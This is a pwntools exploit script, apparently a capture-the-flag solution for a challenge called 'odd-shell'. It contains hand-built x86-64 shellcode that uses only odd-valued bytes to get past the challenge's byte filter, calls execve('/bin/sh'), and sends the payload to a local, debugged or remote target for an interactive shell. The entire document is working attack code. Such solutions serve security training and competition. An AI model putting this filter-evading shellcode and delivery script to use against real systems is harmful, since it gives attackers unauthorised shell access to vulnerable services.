from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
break *$rebase(0x1326)
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('odd-shell.chal.uiuc.tf', 1337)
    else:
        return process(e.path)


def build_odd_shellcode():
    shell = asm("""
       /* push 0x68 */
       mov r15b, 0x35
       add r15, 0x33
       push r15

       /* push 0x732f2f2f6e69622f */
       mov r11, ((0x732f2f2f6e69622f-0xffeffff)^0x01010101)
       xor r11, 0x01010101
       add r11, (0xffeffff)/2
       add r11, (0xffeffff)/2
       add r11, 0x1
       push r11

       /* rdi = rsp */
       xchg r9, rsp
       xchg r9, rdi

       /* rsi = 0x0 */
       xor r13, r13
       xchg r13, rsi
     
       /* rdx = 0x0 */
       xor r13, r13
       xchg r13, rdx

       /* rax = 0x3b */
       mov r9b, 0x3b
       xchg r9, rax

       /* execve(rdi="/bin/sh",rsi=0x0,rdx=0x0) */
       syscall
    """)
    return shell


shell = build_odd_shellcode()

p = start()
p.recvline(b'Display your oddities:')
p.sendline(shell)
p.interactive()
